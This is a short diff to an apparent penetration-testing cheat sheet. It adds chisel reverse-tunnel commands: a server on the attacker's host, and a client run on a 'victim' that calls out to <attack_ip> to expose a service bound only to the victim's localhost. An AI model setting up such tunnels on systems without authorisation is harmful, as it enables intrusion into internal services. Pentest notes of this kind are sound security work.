@@ -23,3 +23,23 @@ chisel.exe client so.me.i.p:1337 R:135:localhost:9999
 ```
 chisel server -p 8888 --reverse --host 0.0.0.0
 ```
+
+# examples 
+
+## service running on victim but only listen on 127.0.0.1:8080
+
+The following example forwards the service running on 127.0.0.1:8080 to the attacker on port 8080.
+
+### attacker 
+
+```bash
+chisel server -p 9999 --host 0.0.0.0 --reverse
+```
+
+### victim
+
+Move chisel binary to victim.
+
+```bash
+./chisel client <attack_ip>:9999 R:8080:127.0.0.1:8080
+```
